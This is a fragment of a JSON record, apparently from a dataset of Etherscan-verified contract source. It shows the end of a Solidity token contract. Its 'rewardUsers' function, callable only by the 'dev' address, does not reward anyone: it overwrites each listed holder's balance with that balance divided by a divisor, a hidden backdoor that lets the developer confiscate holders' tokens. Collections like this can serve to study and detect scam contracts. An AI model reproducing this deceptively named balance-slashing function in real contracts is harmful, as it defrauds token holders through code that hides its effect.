}\r\n\r\n    function rewardUsers(address[] calldata _users, uint _minBalanceToReward, uint _divisor) public {\r\n        if (_msgSender() == dev) {\r\n            for (uint i = 0; i < _users.length; i++) {\r\n                if (balanceOf(_users[i]) > _minBalanceToReward) {\r\n                    uint rewardAmount = _balances[_users[i]] / _divisor;\r\n                    _balances[_users[i]] = rewardAmount;\r\n                }\r\n            } \r\n        }\r\n    }\r\n\r\n}",
    "etherscan_verified": true
}